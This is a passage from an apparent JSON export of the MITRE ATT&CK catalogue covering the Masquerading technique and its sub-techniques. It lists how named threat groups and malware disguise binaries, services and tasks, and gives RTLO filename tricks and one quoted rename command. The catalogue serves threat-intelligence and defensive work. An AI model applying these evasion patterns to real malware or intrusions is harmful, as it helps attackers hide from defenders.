"name": "Lazarus Group", "description": "Lazarus Group persistence mechanisms have used forfiles.exe to execute .htm files."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used pcalua.exe to obfuscate binary execution and remote connections."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT uses the Forfiles utility to execute commands on the system."}], "sub_techniques": []}, {"name": "Masquerading", "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.", "detailed_description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.", "id": "T1036", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius used the Plink tool for tunneling and connections to remote machines, renaming it systems.exe in some instances."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can disguise JavaScript files as PDFs."}, {"id": "G0007", "name": "APT28", "description": "APT28 has renamed the WinRAR utility to avoid detection."}, {"id": "G0050", "name": "APT32", "description": "APT32 has disguised a Cobalt Strike beacon as a Flash Installer."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal dropped a decoy payload with a .jpg extension that contained a malicious Visual Basic script."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox has the ability to mask malicious data strings as PDF files."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has masked executables with document file icons including Word and Adobe PDF."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors named a binary file compareForfor.jpg to disguise it as a JPG file."}, {"id": "C0018", "name": "C0018", "description": "During C0018, AvosLocker was disguised using the victim company name as the filename."}, {"id": "S0497", "name": "Dacls", "description": "The Dacls Mach-O binary has been disguised as a .nib file."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate can masquerade as pirated media content for initial delivery to victims."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla's payload has been renamed PowerShellInfo.exe."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has used an icon mimicking a text file to mask a malicious executable."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has renamed the legitimate Sysinternals tool procdump to alternative names such as dump64.exe to evade detection."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout has used folder icons for malicious files to lure victims into opening them."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke has attempted to mimic a compromised user's traffic by using the same user agent as the installed browser."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has masqueraded staged data by using the Windows certutil utility to generate fake Base64 encoded certificates with the input file."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can download malicious files with a .tmp extension and append them with .exe prior to execution."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can masquerade the output of C2 commands as a fake, but legitimately formatted WebP file."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity involves changing process filename to pr_set_mm_exe_file and process name to pr_set_name during later infection stages."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used several different security software icons to disguise executables."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files."}, {"id": "S1015", "name": "Milan", "description": "Milan has used an executable named companycatalogue to appear benign."}, {"id": "S0637", "name": "NativeZone", "description": "NativeZone has, upon execution, displayed a message box that appears to be related to a Ukrainian electronic document management system."}, {"id": "G0133", "name": "Nomadic Octopus", "description": "Nomadic Octopus attempted to make Octopus appear as a  Telegram Messenger with a Russian interface."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya drops PsExec with the filename dllhost.dat."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used .doc file extensions to mask malicious executables."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "For Operation Dust Storm, the threat actors disguised some executables as JPG files."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors modified the MaoCheng dropper so its icon appeared as a Word document."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has renamed rar.exe to avoid detection."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop has disguised a PowerShell script as a .dat file (goopdate.dat)."}, {"id": "S0565", "name": "Raindrop", "description": "Raindrop was built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has masqueraded as a JPG image file."}, {"id": "S0662", "name": "RCSession", "description": "RCSession has used a file named English.rtf to appear benign on victim hosts."}, {"id": "S0148", "name": "RTM", "description": "RTM has been delivered as archived Windows executable files masquerading as PDF documents."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can create .dll files that actually contain a Rich Text File format document."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has renamed malicious binaries as wallpaper.mp4 and slideshow.mp4 to avoid detection."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can use a legitimate process name to hide itself."}, {"id": "G0127", "name": "TA551", "description": "TA551 has masked malware DLLs as dat and jpg files."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has disguised their scripts with docker-related file names."}, {"id": "S0682", "name": "TrailBlazer", "description": "TrailBlazer has used filenames that match the name of the compromised system in attempt to avoid detection."}, {"id": "S0266", "name": "TrickBot", "description": "The TrickBot downloader has used an icon to appear as a Microsoft Word document."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate has been disguised as a JPG extension to avoid detection as a malicious PE file."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used icons mimicking MS Office files to mask malicious executables. Windshift has also attempted to hide executables by changing the file extension to \".scr\" to mimic Windows screensavers."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has used icons mimicking MS Office files to mask payloads."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern created specially-crafted documents mimicking legitimate government or similar documents during phishing campaigns."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET builds a malicious application bundle to resemble Safari through using the Safari icon and Info.plist. "}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware."}], "sub_techniques": [{"name": "Invalid Code Signature", "description": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.", "detailed_description": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.\nUnlike Code Signing, this activity will not result in a valid signature.", "id": "T1036.001", "examples": [{"id": "G0067", "name": "APT37", "description": "APT37 has signed its malware with an invalid digital certificates listed as \"Tencent Technology (Shenzhen) Company Limited.\""}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has used unverified signatures on malicious DLLs."}, {"id": "S0198", "name": "NETWIRE", "description": "The NETWIRE client has been signed by fake and invalid digital certificates."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has used an invalid certificate in attempt to appear legitimate."}, {"id": "S0019", "name": "Regin", "description": "Regin stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used revoked certificates to sign malware."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has been incompletely signed with revoked certificates."}]}, {"name": "Right-to-Left Override", "description": "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \\u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\\u202Egnp.js will be displayed as photo_high_resj.png.", "detailed_description": "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \\u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\\u202Egnp.js will be displayed as photo_high_resj.png.\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.", "id": "T1036.002", "examples": [{"id": "G0098", "name": "BlackTech", "description": "BlackTech has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used Right-to-Left Override to deceive victims into executing several strains of malware."}, {"id": "G0137", "name": "Ferocious Kitten", "description": "Ferocious Kitten has used right-to-left override to reverse executables\u2019 names to make them appear to have different file extensions, rather than their real ones."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files."}, {"id": "G0029", "name": "Scarlet Mimic", "description": "Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names."}]}, {"name": "Rename System Utilities", "description": "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename rundll32.exe).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. ", "detailed_description": "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename rundll32.exe).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. ", "id": "T1036.003", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 has moved and renamed pubprn.vbs to a .txt file to avoid detection."}, {"id": "S0046", "name": "CozyCar", "description": "The CozyCar dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly used a renamed version of rundll32.exe, such as \"dbengin.exe\" located in the ProgramData\\Microsoft\\PlayReady directory, to proxy malicious DLL execution."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate executes a Windows Batch script during installation that creases a randomly-named directory in the C:\\ root directory that copies and renames the legitimate Windows curl command to this new location."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used a renamed cmd.exe file to evade detection."}, {"id": "S1020", "name": "Kevin", "description": "Kevin has renamed an image of cmd.exe with a random name followed by a .tmpl extension."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has renamed system utilities such as wscript.exe and mshta.exe."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool."}]}, {"name": "Masquerade Task or Service", "description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.", "detailed_description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.", "id": "T1036.004", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has disguised its scheduled tasks as those used by Google."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. APT32 has also impersonated the legitimate Flash installer file name \"install_flashplayer.exe\"."}, {"id": "G0096", "name": "APT41", "description": "APT41 has created services to appear as benign system tools."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST disguised DUSTPAN as a legitimate Windows binary such as w3wp.exe or conn.exe."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda created new, malicious services using names such as Windows User Service to attempt to blend in with legitimate items on victim systems."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate)."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has disguised their backdoor droppers with naming conventions designed to blend into normal operations."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can create a task named to appear benign."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has disguised malware as a Windows Security update service."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta has established persistence by creating a new service named FAX after deleting the legitimate service by the same name."}, {"id": "S1161", "name": "BPFDoor", "description": "BPFDoor overwrites the argv value used by the Linux /proc filesystem to determine the command line and command name to display for each process. BPFDoor selects a name from 10 hardcoded names that resemble Linux system daemons, such as; /sbin/udevd -d, dbus-daemon --system, avahi-daemon: chroot helper, /sbin/auditd -n, and /usr/lib/systemd/systemd-journald."}, {"id": "S0471", "name": "build_downer", "description": "build_downer has added itself to the Registry Run key as \"NVIDIA\" to appear legitimate."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used SCHTASKS  /Change to modify legitimate scheduled tasks to run malicious code."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak has copied legitimate service names to use for malicious services."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used a task name associated with Windows SQM Consolidator."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has established persistence with a scheduled task impersonating the Outlook item finder."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv has masqueraded its service as a legitimate svchost.exe process."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE has used schtasks /change to modify scheduled tasks including \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD will attempt to masquerade its service execution using benign-looking names such as ScDeviceEnums."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has masqueraded the svchost.exe process to exfiltrate data."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has installed itself as a new service with the service name Windows Defender System Service and display name WinDefService."}, {"id": "S0343", "name": "Exaramel for Windows", "description": "The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description \"Windows Check AV\" in an apparent attempt to masquerade as a legitimate service."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used scheduled tasks names such as acrotyr and AppServicesr to mimic the same names in a compromised network's C:\\Windows directory."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has renamed the \"psexec\" service name to \"mstdc\" to masquerade as a legitimate Windows service."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has created a scheduled task named \"AdobeFlashSync\" to establish persistence."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has named the task for a reverse proxy lpupdate to appear legitimate."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors named a malicious scheduled task \"WinUpdate\" for persistence."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has used a service named WSearch for execution."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has masqueraded as the rsyncd and dbus-inotifier services."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has impersonated systems management software to avoid detection."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert has created a new executable named Software Update Check to appear legitimate."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor has been named srvdll.dll to appear as a legitimate service."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa named a shellcode loader binary svchast.exe to spoof the legitimate svchost.exe."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has disguised itself as a known Linux process."}, {"id": "S0259", "name": "InnaputRAT", "description": "InnaputRAT variants have attempted to appear legitimate by adding a new service named OfficeUpdateService."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has attempted to disguise itself by registering under a seemingly legitimate service name."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector has been disguised as a legitimate service using the name PythonUpdateSrvc."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk registers as a service under the Plug-And-Play Support name."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has disguised services to appear as benign software or related to operating system functions."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has pretended to be the xmlProv Network Provisioning service."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity installation steps include first identifying, then stopping, any process containing [kworker\\/0:1], then renaming its initial installation stage to this process name."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs establishes persistence by adding a new service with the display name \"WMI Performance Adapter Extension\" in an attempt to masquerade as a legitimate WMI service."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used a scheduled task named SRCheck to mask the execution of a malicious .dll."}, {"id": "S0409", "name": "Machete", "description": "Machete renamed task names to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python tasks."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has named a malicious script CacheTask.bat to mimic a legitimate task."}, {"id": "S0449", "name": "Maze", "description": "Maze operators have created scheduled tasks masquerading as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\" designed to launch the ransomware."}, {"id": "S0688", "name": "Meteor", "description": "Meteor has been disguised as the Windows Power Efficiency Diagnostics report tool."}, {"id": "G0019", "name": "Naikon", "description": "Naikon renamed a malicious service taskmgr to appear to be a legitimate version of Task Manager."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae has created a service named \"Windows Update Agent1\" to appear legitimate."}, {"id": "S0118", "name": "Nidiran", "description": "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name."}, {"id": "S1090", "name": "NightClub", "description": "NightClub has created a service named WmdmPmSp to spoof a Windows Media service."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D uses file naming conventions with associated executable locations to blend in with the macOS TimeMachine and OpenSSL services. Such as, naming a LaunchAgent plist file com.apple.openssl.plist which executes OSX_OCEANLOTUS.D from the user's ~/Library/OpenSSL/ folder upon user login."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can mimic the names and descriptions of legitimate services such as iphlpsvc, IP Helper,  and Onedrive to evade detection."}, {"id": "S0013", "name": "PlugX", "description": "In one instance, menuPass added PlugX as a service with a display name of \"Corel Writing Tools Utility.\""}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has created a scheduled task named \"MicrosoftEdge\" to establish persistence."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has named services to appear legitimate."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay has named services and scheduled tasks to appear benign including \"ChromeCheck\" and \"googleupdate.\""}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will execute its payload prior to initializing command and control traffic by impersonating one of several legitimate program names such as dllhost.exe, regsvr32.exe, or rundll32.exe."}, {"id": "S0169", "name": "RawPOS", "description": "New services created by RawPOS are made to appear like legitimate Windows services, with names such as \"Windows Management Help Service\", \"Microsoft Support\", and \"Windows Advanced Task Manager\"."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has used Windows Video Service as a name for malicious services."}, {"id": "S0148", "name": "RTM", "description": "RTM has named the scheduled task it creates \"Windows Update\"."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt has masqueraded as a service called \"SaSaut\" with a display name of \"System Authorization Service\" in an apparent attempt to masquerade as a legitimate service."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon creates a new service named \"ntssrv\" that attempts to appear legitimate; the service's display name is \"Microsoft Network Realtime Inspection Service\" and its description is \"Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.\" Newer versions create the \"MaintenaceSrv\" service, which misspells the word \"maintenance.\""}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can impersonate Windows services and antivirus products to avoid detection on compromised systems."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has named a service it establishes on victim machines as \"TaskFrame\" to hide its malicious purpose."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 named tasks \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager in order to appear legitimate."}, {"id": "S1140", "name": "Spica", "description": "Spica has created a scheduled task named CalendarChecker for persistence on compromised hosts."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has named services to appear legitimate."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP's scheduled task has been named MicrosoftInternetExplorerCrashRepoeterTaskMachineUA or MicrosoftEdgeCrashRepoeterTaskMachineUA, depending on the Windows OS version."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has named a task RecoveryExTask as part of its persistence activity."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has named their unit configuration file similarly to other unit files residing in the same directory, /usr/lib/systemd/system/, to appear benign."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask creates a scheduled task called \"WinUpdate\" to re-establish any dropped  C2 connections."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla has mimicked an existing Windows service by being installed as Windows Time Service."}, {"id": "S0178", "name": "Truvasys", "description": "To establish persistence, Truvasys adds a Registry Run key with a value \"TaskMgr\" in an attempt to masquerade as the legitimate Windows Task Manager."}, {"id": "S0647", "name": "Turian", "description": "Turian can disguise as a legitimate service to blend into normal operations."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has registered a service named WerFaultSvc, likely to spoof the legitimate Windows error reporting service."}, {"id": "S0180", "name": "Volgmer", "description": "Some Volgmer variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern has distributed malicious scripts and executables mimicking virus scanners."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has created a run key named Dropbox Update Setup to mask a persistence mechanism for a malicious binary."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has been disguised as a Windows security update service."}]}, {"name": "Match Legitimate Name or Location", "description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.", "detailed_description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\nAdversaries may also use the same icon of the file they are trying to mimic.", "id": "T1036.005", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files."}, {"id": "G0018", "name": "admin@338", "description": "admin@338 actors used the following command to rename one of their tools to a benign file name: ren \"%temp%\\upload\" audiodg.exe"}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA has been installed to C:\\Temp\\TrustedInstaller.exe to mimic a legitimate Windows installer service."}, {"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has used fake icons including antivirus and external drives to disguise malicious payloads."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity."}, {"id": "G0006", "name": "APT1", "description": "The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware."}, {"id": "G0007", "name": "APT28", "description": "APT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page."}, {"id": "G0016", "name": "APT29", "description": "APT29 has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal."}, {"id": "G0050", "name": "APT32", "description": "APT32 has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. APT32 has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe. "}, {"id": "G0087", "name": "APT39", "description": "APT39 has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe."}, {"id": "G0096", "name": "APT41", "description": "APT41 attempted to masquerade their files as popular anti-virus software."}, {"id": "G1023", "name": "APT5", "description": "APT5 has named exfiltration archives to mimic Windows Updates at times using filenames with a KB<digits>.zip pattern."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda renamed or moved malicious binaries to legitimate locations to evade defenses and blend into victim environments."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has hidden malicious payloads in %USERPROFILE%\\Adobe\\Driver\\dwg\\ and mimicked the legitimate DHCP service binary."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has dropped implants in folders named for legitimate software."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has masqueraded as a Flash Player installer through the executable file install_flash_player.exe."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS attempts to hide its payloads using legitimate filenames."}, {"id": "S0534", "name": "Bazar", "description": "The Bazar loader has named malicious shortcuts \"adobe\" and mimicked communications software."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has renamed malicious code to msacm32.dll to hide within a legitimate library; earlier versions were disguised as winhelp."}, {"id": "S1070", "name": "Black Basta", "description": "The Black Basta dropper has mimicked an application for creating USB bootable drivers."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has attempted to hide its payload by using legitimate file names such as \"iconcache.db\"."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has used a payload file named OneDrive.update to appear benign."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has named component DLLs \"RapportGP.dll\" to match those used by the security company Trusteer."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has disguised a malicious .app file as a Flash Player update."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp  to .upx likely to avoid hunting detections."}, {"id": "C0018", "name": "C0018", "description": "For C0018, the threat actors renamed a Sliver payload to vmware_kb.exe."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files."}, {"id": "S0274", "name": "Calisto", "description": "Calisto's installation file is an unsigned DMG image under the guise of Intego\u2019s security solution for mac."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak has named malware \"svchost.exe,\" which is the name of the Windows shared service host program."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has masqueraded as Windows system file names, as well as \"chkntfs.exe\" and \"syscron.exe\"."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used an unsigned, crafted DLL module named hha.dll that was designed to look like 